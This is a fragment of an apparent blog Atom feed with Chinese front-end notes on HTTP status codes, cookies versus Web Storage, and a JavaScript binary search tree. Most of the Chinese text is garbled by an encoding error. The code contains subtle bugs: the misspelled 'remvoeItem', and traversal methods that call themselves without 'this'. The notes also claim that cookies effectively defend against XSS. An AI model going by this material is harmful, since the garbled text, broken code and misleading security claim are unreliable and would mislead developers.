è¯·æ±‚æ–¹æ³•</h4><p>GET, POST, HEAD, PUT, DELETE, OPTIONS, TRACE, CONNECT</p><h4 id="HTTP-çŠ¶æ€å“åº”ç "><a href="#HTTP-çŠ¶æ€å“åº”ç " class="headerlink" title="HTTP çŠ¶æ€å“åº”ç "></a>HTTP çŠ¶æ€å“åº”ç </h4><h5 id="1-Information-è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†"><a href="#1-Information-è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†" class="headerlink" title="1** Information è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†"></a>1** Information è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†</h5><ul><li>100 Continue å®¢æˆ·å¿…é¡»ç»§ç»­å‘å‡ºè¯·æ±‚*   101 Switch Protocols å®¢æˆ·è¦æ±‚æœåŠ¡å™¨æ ¹æ®è¯·æ±‚è½¬æ¢ HTTP åè®®ç‰ˆæœ¬ <!--more--></li></ul><h5 id="2-Successful-æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—"><a href="#2-Successful-æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—" class="headerlink" title="2** Successful æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—"></a>2** Successful æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—</h5><ul><li>200 OK è¯·æ±‚æˆåŠŸ</li><li>201 Created æç¤ºçŸ¥é“æ–°é—»ç•Œçš„ URL</li><li>202 Accepted æ¥å—å¤„ç†ï¼Œä½†å¤„ç†æœªå®Œæˆ</li><li>203 Non-Authoritative Information è¿”å›ä¿¡æ¯ä¸ç¡®å®šæˆ–ä¸å®Œæ•´</li><li>204 No Content è¯·æ±‚æ”¶åˆ°ï¼Œä½†è¿”å›ä¿¡æ¯ä¸ºç©º</li><li>205 Reset Content æœåŠ¡å™¨å®Œæˆäº†è¯·æ±‚ï¼Œç”¨æˆ·ä»£ç†å¿…é¡»å¤ä½å½“å‰å·²ç»æµè§ˆè¿‡çš„æ–‡ä»¶</li><li>206 Partial Content æœåŠ¡å™¨å·²ç»å®Œæˆäº†éƒ¨åˆ†ç”¨æˆ·çš„ GET è¯·æ±‚</li></ul><h5 id="3-Redirection-é‡å®šå‘"><a href="#3-Redirection-é‡å®šå‘" class="headerlink" title="3** Redirection é‡å®šå‘"></a>3** Redirection é‡å®šå‘</h5><ul><li>300 Multiple Choices è¯·æ±‚çš„èµ„æºå¯åœ¨å¤šå¤„å¾—åˆ°</li><li>301 Moved Permanently æ°¸ä¹…è·³è½¬</li><li>302 Found åœ¨å…¶ä»–åœ°å€å‘ç°äº†è¯·æ±‚æ•°æ®</li><li>303 See Other å»ºè®®å®¢æˆ·è®¿é—®å…¶ä»– URL æˆ–è®¿é—®æ–¹å¼</li><li>304 Not Modified å®¢æˆ·ç«¯æ„è§æ‰§è¡Œäº† GETï¼Œä½†æ–‡ä»¶æœªå˜åŒ–</li><li>305 Use Proxy è¯·æ±‚çš„èµ„æºå¿…é¡»ä»æœåŠ¡å™¨æŒ‡å®šçš„åœ°å€å¾—åˆ°</li><li>306 Unused å‰ä¸€ç‰ˆæœ¬ HTTP ä¸­ä½¿ç”¨çš„ä»£ç ï¼Œç°è¡Œç‰ˆæœ¬ä¸­ä¸å†ä½¿ç”¨</li><li>307 Temporary Redirect ç”³æ˜è¯·æ±‚çš„èµ„æºä¸´æ—¶æ€§åˆ é™¤</li></ul><h5 id="4-Client-Error"><a href="#4-Client-Error" class="headerlink" title="4** Client Error"></a>4** Client Error</h5><ul><li>400 Bad Request é”™è¯¯è¯·æ±‚ï¼Œå¦‚è¯­æ³•é”™è¯¯</li><li>401 Unauthorized æœªæˆæƒ</li><li>402 Payment Required åŸŸåä¿ç•™ä¸ºæœªæ¥ä½¿ç”¨</li><li>403 Forbidden ç¦æ­¢è®¿é—®</li><li>404 Not Found æ‰¾ä¸åˆ°æ–‡ä»¶ã€æŸ¥è¯¢æˆ– URL</li><li>405 Method Not Allowed å½“å‰ HTTP è¯·æ±‚æ–¹æ³•ä¸è¢«å…è®¸</li><li>406 Not Acceptable æ ¹æ®ç”¨æˆ·å‘é€çš„ Acceptï¼Œè¯·æ±‚èµ„æºä¸å¯è®¿é—® â€¦</li></ul><h5 id="5-Server-Error"><a href="#5-Server-Error" class="headerlink" title="5** Server Error"></a>5** Server Error</h5><ul><li>500 Internal Server Error å†…éƒ¨æœåŠ¡å™¨é”™è¯¯</li><li>501 Not Implemented æœåŠ¡å™¨ä¸æ”¯æŒéœ€è¦ç”¨æ¥å®Œæˆè¯·æ±‚çš„å‡½æ•°</li><li>502 Bad Gateway ç½‘å…³é”™è¯¯</li><li>503 Service Unavailable æœåŠ¡å™¨ç»´æŠ¤ä¸­æˆ–è¿‡è½½</li><li>504 Gateway Timeout ç½‘å…³è¶…æ—¶</li><li>505 Http Version Not Supported ä¸æ”¯æŒçš„ HTTP ç‰ˆæœ¬</li></ul><h5 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="noopener">http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a></li><li><a href="http://nonfu.me/p/6888.html" target="_blank" rel="noopener">http://nonfu.me/p/6888.html</a></li></ul><h4 id="cookie-localStorage-å’Œ-sessionStorage-çš„å¼‚åŒ"><a href="#cookie-localStorage-å’Œ-sessionStorage-çš„å¼‚åŒ" class="headerlink" title="cookie, localStorage å’Œ sessionStorage çš„å¼‚åŒ"></a>cookie, localStorage å’Œ sessionStorage çš„å¼‚åŒ</h4><h5 id="ç›¸åŒç‚¹"><a href="#ç›¸åŒç‚¹" class="headerlink" title="ç›¸åŒç‚¹"></a>ç›¸åŒç‚¹</h5><ul><li>éƒ½å±äºå®¢æˆ·ç«¯æˆ–æµè§ˆå™¨å­˜å‚¨æœºåˆ¶</li><li>éƒ½å…·æœ‰åŒæºå®‰å…¨ç­–ç•¥</li></ul><h5 id="ä¸åŒç‚¹"><a href="#ä¸åŒç‚¹" class="headerlink" title="ä¸åŒç‚¹"></a>ä¸åŒç‚¹</h5><p>localStorage å’Œ sessionStorage æ˜¯ HTML5 çš„æ–° APIsï¼Œæ„å‘³ç€ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒï¼Œç°ä»£æµè§ˆå™¨åŸºæœ¬éƒ½æ”¯æŒã€‚</p><p>sessionStorage å­˜å‚¨çš„ä¿¡æ¯ä¼šåœ¨æµè§ˆå™¨å…³é—­åæ¸…é™¤ï¼Œä½†é¡µé¢å…³é—­è€Œæµè§ˆå™¨ä¸å…³é—­åˆ™ä¸ä¼šè¢«æ¸…é™¤ï¼Œé¡¾åæ€ä¹‰ï¼Œå…¶åªå­˜æ´»åœ¨ä¸€ä¸ªæµè§ˆå™¨ä¼šè¯ä¸­ã€‚ å¦‚æœä½ å¸Œæœ›ä¿å­˜çš„ä¿¡æ¯åœ¨æµè§ˆå™¨å…³é—­é‡å¼€åè¿˜èƒ½ä½¿ç”¨ï¼Œåˆ™åº”è¯¥ç”¨ localStorageã€‚</p><p>localStorage å’Œ sessionStorage åº”è¯¥ç”¨æ¥ä¿å­˜éæ•æ„Ÿå¹¶ä¸”éœ€è¦åœ¨åŒæºé¡µé¢é—´ä½¿ç”¨çš„ä¿¡æ¯ï¼Œä¸¤è€…éƒ½èƒ½è¢«å®¢æˆ·ç«¯æˆ–æµè§ˆå™¨è½»æ˜“è¯»å–å’Œæ”¹å˜ï¼Œæ‰€ä»¥ä¸åº”è¯¥ä¾èµ–è¿™ä¸¤è€…ä¿å­˜æ•æ„Ÿæˆ–å®‰å…¨ä¿¡æ¯ã€‚</p><p>æŸ¥çœ‹æµè§ˆå™¨æ˜¯å¦æ”¯æŒ localStorage å’Œ sessionStorageï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.localStorage != <span class="literal">undefined</span>;</span><br><span class="line"><span class="built_in">window</span>.sessionStorage != <span class="literal">undefined</span></span><br><span class="line"></span><br><span class="line">localStorage å’Œ sessionStorage åŸºæœ¬æ“ä½œï¼š</span><br><span class="line"></span><br><span class="line">localStorage.setItem(<span class="string">'foo'</span>, <span class="string">'bar'</span>);</span><br><span class="line">localStorage[<span class="string">'foo'</span>] = <span class="string">'bar'</span>;</span><br><span class="line">localStorage.foo = <span class="string">'bar'</span></span><br><span class="line">localStorage.getItem(<span class="string">'foo'</span>);    <span class="comment">// bar</span></span><br><span class="line">localStorage.remvoeItem(<span class="string">'foo'</span>);</span><br><span class="line">localStorage.clear();</span><br><span class="line"></span><br><span class="line">sessionStorage.setItem(<span class="string">'foo'</span>, <span class="string">'bar'</span>);</span><br><span class="line">sessionStorage[<span class="string">'foo'</span>] = <span class="string">'bar'</span>;</span><br><span class="line">sessionStorage.foo = <span class="string">'bar'</span>;</span><br><span class="line">sessionStorage.getItem(<span class="string">'foo'</span>);  <span class="comment">// bar</span></span><br><span class="line">sessionStorage.remvoeItem(<span class="string">'foo'</span>);</span><br><span class="line">sessionStorage.clear();</span><br></pre></td></tr></table></figure><p>å…³ç³»åˆ°æ•æ„Ÿä¿¡æ¯åˆ™åº”è¯¥ç”¨ cookieï¼Œå› ä¸ºcookie ç›¸å¯¹è¾ƒéš¾è¢«ç”¨æˆ·è¯»å–å’Œå†™å…¥ï¼Œä½†å¦‚æœç”¨é SSL ä¼ è¾“ï¼Œcookie åŒæ ·å¯èƒ½åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«æˆªå–ï¼Œå°¤å…¶æ˜¯åœ¨ç”¨ä¸€ä¸ªå…¬å…± wifiã€‚</p><p>cookie å®‰å…¨ç­‰çº§æ¯”å‰ä¸¤è€…é«˜ï¼Œå®ƒå¯ä»¥æœ‰æ•ˆé˜²å¾¡ XSS(Cross-Site Scripting)ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨ cookie æ¥å­˜å‚¨ä¸€äº›éªŒè¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç™»é™† tokenæˆ–å¹¿å‘Šå•†çš„ç”¨æˆ·è¿½è¸ªã€‚</p><p>cookie å¤§å¤šè¢«ç”¨æ¥éªŒè¯ç”¨æˆ·æ•°æ®ï¼Œåœ¨åŒæºå†…ï¼Œé¡µé¢æœ¬èº« HTTP è¯·æ±‚åŒ…æ‹¬å…¶å†…éƒ¨çš„ Ajax è¯·æ±‚ã€å›¾ç‰‡ã€æ ·å¼ã€è„šæœ¬å’Œå­—ä½“çš„ HTTP å¤´éƒ½åŒ…å« cookieï¼Œå› ä¸ºä¸åº”è¯¥ç”¨ cookie å­˜å‚¨å¤§é‡æ•°æ®ï¼Œäº‹å®ä¸Šæµè§ˆå™¨ä¼šå¯¹è¿‡é•¿ cookie è¿›è¡Œæˆªå–çš„ã€‚</p><p>cookie æœ¬èº«æ˜¯ä¸€æ®µå­—ç¬¦ä¸²ï¼ŒsessionStorage å’Œ localStorage åˆ™æ˜¯ä»¥ JavaScript primitives(JSON serialise) å½¢å¼ä¿å­˜ï¼Œå¯è¯»æ€§å¾ˆé«˜ã€‚</p><p>æå– cookie ä½œä¸ºå¯¹è±¡è¿”å›ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cookieArr = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line">    <span class="keyword">var</span> cookieObj = &#123;&#125;;</span><br><span class="line">    cookieArr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">v, k</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> firstEqualSign = v.indexOf(<span class="string">'='</span>);</span><br><span class="line">        <span class="keyword">var</span> cookieKey = v.slice(<span class="number">0</span>, firstEqualSign);</span><br><span class="line">        <span class="keyword">var</span> cookieVal = v.slice(firstEqualSign + <span class="number">1</span>);</span><br><span class="line">        cookieObj[cookieKey] = cookieVal;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cookieObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å‚è€ƒ-3"><a href="#å‚è€ƒ-3" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://stackoverflow.com/questions/19867599/what-is-the-difference-between-localstorage-sessionstorage-session-and-cookies" target="_blank" rel="noopener">What is the difference between localStorage, sessionStorage, session and cookies?</a></li><li><a href="http://diveintohtml5.info/storage.html" target="_blank" rel="noopener">THE PAST, PRESENT &amp; FUTURE OF LOCAL STORAGE FOR WEB APPLICATIONS</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API" target="_blank" rel="noopener">Using the Web Storage API</a></li></ul><h4 id="æ€»å‚è€ƒ"><a href="#æ€»å‚è€ƒ" class="headerlink" title="æ€»å‚è€ƒ"></a>æ€»å‚è€ƒ</h4><ul><li><a href="http://www.cnblogs.com/whitewolf/archive/2013/04/16/3024843.html" target="_blank" rel="noopener">http://www.cnblogs.com/whitewolf/archive/2013/04/16/3024843.html</a></li><li><a href="http://stackoverflow.com/questions/111102/how-do-javascript-closures-work" target="_blank" rel="noopener">http://stackoverflow.com/questions/111102/how-do-javascript-closures-work</a></li><li><a href="http://www.sitepoint.com/key-differences-post/" target="_blank" rel="noopener">http://www.sitepoint.com/key-differences-post/</a></li><li><a href="http://stackoverflow.com/questions/4775722/check-if-object-is-array" target="_blank" rel="noopener">http://stackoverflow.com/questions/4775722/check-if-object-is-array</a></li><li><a href="http://stackoverflow.com/questions/6490252/vertically-centering-a-div-inside-another-div" target="_blank" rel="noopener">http://stackoverflow.com/questions/6490252/vertically-centering-a-div-inside-another-div</a></li><li><a href="http://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript" target="_blank" rel="noopener">http://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;æ¸…é™¤æµ®åŠ¨&quot;&gt;&lt;a href=&quot;#æ¸…é™¤æµ®åŠ¨&quot; class=&quot;headerlink&quot; title=&quot;æ¸…é™¤æµ®åŠ¨&quot;&gt;&lt;/a&gt;æ¸…é™¤æµ®åŠ¨&lt;/h4&gt;&lt;h5 id=&quot;clear&quot;&gt;&lt;a href=&quot;#clear&quot; class=&quot;headerlink&quot; title=&quot;clear&quot;&gt;&lt;/a&gt;clear&lt;/h5&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* æ”¾åœ¨æµ®åŠ¨å…ƒç´ ä¹‹åæ¸…é™¤æµ®åŠ¨ */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.clear&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attribute&quot;&gt;clear&lt;/span&gt;: both;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
  </entry>
  
  <entry>
    <title>JavaScript äºŒå‰æ ‘</title>
    <link href="http://youngdze.co/2015/10/22/javascript-binary-search-tree/"/>
    <id>http://youngdze.co/2015/10/22/javascript-binary-search-tree/</id>
    <published>2015-10-22T10:50:24.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åƒæˆ‘è¿™ç§é‡ç”Ÿç¨‹åºå‘˜è¿å„å¤§å…¬å¸æ ¡æ‹›ç¬”è¯•éƒ½è¿‡ä¸äº†ï¼Œä¸»è¦æ˜¯æ•°æ®ç»“æ„å’Œç®—æ³•è–„å¼±ï¼Œä»Šå¤©å°ç±³å‡ºäº†é“äºŒå‰æ ‘ï¼Œè€ƒäºŒå‰æ ‘çš„åˆ†å±‚éå†ï¼Œæˆ‘å½“ç„¶æ˜¯ä¸ä¼šåšï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†ã€‚</p></blockquote><h4 id="èŠ‚ç‚¹å®šä¹‰"><a href="#èŠ‚ç‚¹å®šä¹‰" class="headerlink" title="èŠ‚ç‚¹å®šä¹‰"></a>èŠ‚ç‚¹å®šä¹‰</h4><p>äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">data, left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = data;</span><br><span class="line">    <span class="keyword">this</span>.left = left;</span><br><span class="line">    <span class="keyword">this</span>.right = right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>ç»™ <code>Node</code> æ·»åŠ ä¸€ä¸ªè·å¾—å½“å‰èŠ‚ç‚¹æ•°æ®çš„æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Node.prototype.getData = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="äºŒå‰æ ‘å®šä¹‰"><a href="#äºŒå‰æ ‘å®šä¹‰" class="headerlink" title="äºŒå‰æ ‘å®šä¹‰"></a>äºŒå‰æ ‘å®šä¹‰</h4><p>å®šä¹‰äºŒå‰æ ‘ï¼Œåˆå§‹æ ¹èŠ‚ç‚¹ä¸º nullï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BST</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ’å…¥"><a href="#æ’å…¥" class="headerlink" title="æ’å…¥"></a>æ’å…¥</h4><p>äºŒå‰æ ‘çš„æ’å…¥è§„åˆ™ï¼š</p><ol><li>æ˜¯å¦æœ‰æ ¹èŠ‚ç‚¹ï¼Œæ²¡æœ‰åˆ™è®¾æ’å…¥èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹2.  æ¯”å½“å‰èŠ‚ç‚¹å€¼å°ï¼Œè½¬ 3ï¼Œå¦åˆ™è½¬ 43.  æ˜¯å¦æœ‰å·¦å¶å­èŠ‚ç‚¹ï¼Œæ²¡æœ‰åˆ™è®¾æ’å…¥èŠ‚ç‚¹ä¸ºå½“å‰èŠ‚ç‚¹å·¦å¶å­èŠ‚ç‚¹ï¼Œå¦åˆ™è®¾å…¶å·¦å¶å­èŠ‚ç‚¹ä¸ºå½“å‰èŠ‚ç‚¹ï¼Œè½¬ 24.  æ˜¯å¦æœ‰å³å¶å­èŠ‚ç‚¹ï¼Œæ²¡æœ‰åˆ™è®¾æ’å…¥èŠ‚ç‚¹ä¸ºå½“å‰ç»“ç‚¹å³å¶å­èŠ‚ç‚¹ï¼Œå¦åˆ™è®¾å…¶å³å¶å­èŠ‚ç‚¹ä¸ºå½“å‰èŠ‚ç‚¹ï¼Œ è½¬ 2</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.insert = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="keyword">new</span> Node(data, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) &#123;</span><br><span class="line">        <span class="keyword">this</span>.root = n;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">        <span class="keyword">let</span> parent;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            parent = current;</span><br><span class="line">            <span class="keyword">if</span> (data &lt; current.getData()) &#123;</span><br><span class="line">                current = current.left;</span><br><span class="line">                <span class="keyword">if</span> (!current) &#123;</span><br><span class="line">                    parent.left = n;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                current = current.right;</span><br><span class="line">                <span class="keyword">if</span> (!current) &#123;</span><br><span class="line">                    parent.right = n;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–æœ€å°å€¼"><a href="#è·å–æœ€å°å€¼" class="headerlink" title="è·å–æœ€å°å€¼"></a>è·å–æœ€å°å€¼</h4><p>åœ¨äºŒå‰æ ‘ä¸­ï¼Œç”±äºè¾ƒå°å€¼éƒ½æ˜¯åœ¨å·¦èŠ‚ç‚¹ï¼Œæ‰€ä»¥éå†å®Œå·¦èŠ‚ç‚¹å³å¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.getMin = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">    <span class="keyword">while</span> (current.left) &#123;</span><br><span class="line">        current = current.left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current.getData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–æœ€å¤§å€¼"><a href="#è·å–æœ€å¤§å€¼" class="headerlink" title="è·å–æœ€å¤§å€¼"></a>è·å–æœ€å¤§å€¼</h4><p>åœ¨äºŒå‰æ ‘ä¸­ï¼Œç”±äºè¾ƒå¤§å€¼éƒ½æ˜¯åœ¨å³èŠ‚ç‚¹ï¼Œæ‰€ä»¥éå†å®Œå³èŠ‚ç‚¹å³å¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.getMax = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">    <span class="keyword">while</span> (current.right) &#123;</span><br><span class="line">        current = current.right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current.getData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–èŠ‚ç‚¹æ•°é‡"><a href="#è·å–èŠ‚ç‚¹æ•°é‡" class="headerlink" title="è·å–èŠ‚ç‚¹æ•°é‡"></a>è·å–èŠ‚ç‚¹æ•°é‡</h4><p>æ€»èŠ‚ç‚¹ = å·¦èŠ‚ç‚¹ + å³èŠ‚ç‚¹ + 1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.countNode = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.countNode(node.left) + <span class="keyword">this</span>.countNode(node.right) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸­åºéå†"><a href="#ä¸­åºéå†" class="headerlink" title="ä¸­åºéå†"></a>ä¸­åºéå†</h4><p>è§„åˆ™æ˜¯å…ˆéå†å·¦èŠ‚ç‚¹ï¼Œç„¶ååˆ°æ ¹èŠ‚ç‚¹ï¼Œæœ€ååˆ°å³èŠ‚ç‚¹ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="noopener">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Sorted_binary_tree_inorder.svg/440px-Sorted_binary_tree_inorder.svg.png" alt="inOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.inOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        inOrder(node.left);</span><br><span class="line">        <span class="built_in">console</span>.log(node.getData());</span><br><span class="line">        inOrder(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å…ˆåºéå†"><a href="#å…ˆåºéå†" class="headerlink" title="å…ˆåºéå†"></a>å…ˆåºéå†</h4><p>è§„åˆ™æ˜¯ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œå…ˆå·¦èŠ‚ç‚¹ï¼Œå†å³èŠ‚ç‚¹ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="noopener">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Sorted_binary_tree_preorder.svg/440px-Sorted_binary_tree_preorder.svg.png" alt="preOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BST.prototype.preOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(node.getData());</span><br><span class="line">        preOrder(node.left);</span><br><span class="line">        preOrder(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ååºéå†"><a href="#ååºéå†" class="headerlink" 